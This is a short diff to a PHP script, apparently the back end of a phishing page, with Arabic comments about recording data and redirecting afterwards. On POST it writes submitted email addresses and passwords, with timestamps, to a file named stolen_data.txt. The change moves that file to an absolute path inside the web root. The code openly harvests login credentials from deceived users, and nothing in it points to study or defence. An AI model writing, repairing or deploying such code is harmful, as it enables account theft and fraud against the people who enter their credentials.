@@ -12,7 +12,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // تسجيل البيانات
     if (!empty($email) && !empty($password)) {
         $data = "Email: $email | Password: $password | Time: " . date('Y-m-d H:i:s') . "\n";
-        file_put_contents('stolen_data.txt', $data, FILE_APPEND);
+        file_put_contents('/var/www/html/stolen_data.txt', $data, FILE_APPEND);
     }
 
     // إعادة التوجيه بعد المعالجة
